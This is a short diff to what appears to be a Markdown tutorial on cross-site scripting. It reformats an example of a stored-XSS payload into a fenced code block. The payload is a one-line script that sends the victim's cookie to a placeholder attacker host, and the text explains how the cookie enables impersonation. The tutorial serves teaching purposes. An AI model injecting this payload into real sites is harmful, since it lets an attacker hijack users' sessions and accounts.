@@ -31,7 +31,9 @@ websites_can_be_easily_defaced_with_xss
 ```
 4. Stored XSS can be used to steal a victims cookie (data on a machine that authenticates a user to a webserver). This can be done by having a victims browser parse the following Javascript code:
 
-   `<script>window.location='http://attacker/?cookie='+document.cookie</script>`
+   ```js
+   <script>window.location='http://attacker/?cookie='+document.cookie</script>
+   ```
 
    This script navigates the users browser to a different URL, this new request will includes a victims cookie as a query parameter. When the attacker has acquired the cookie, they can use it to impersonate the victim. 
 
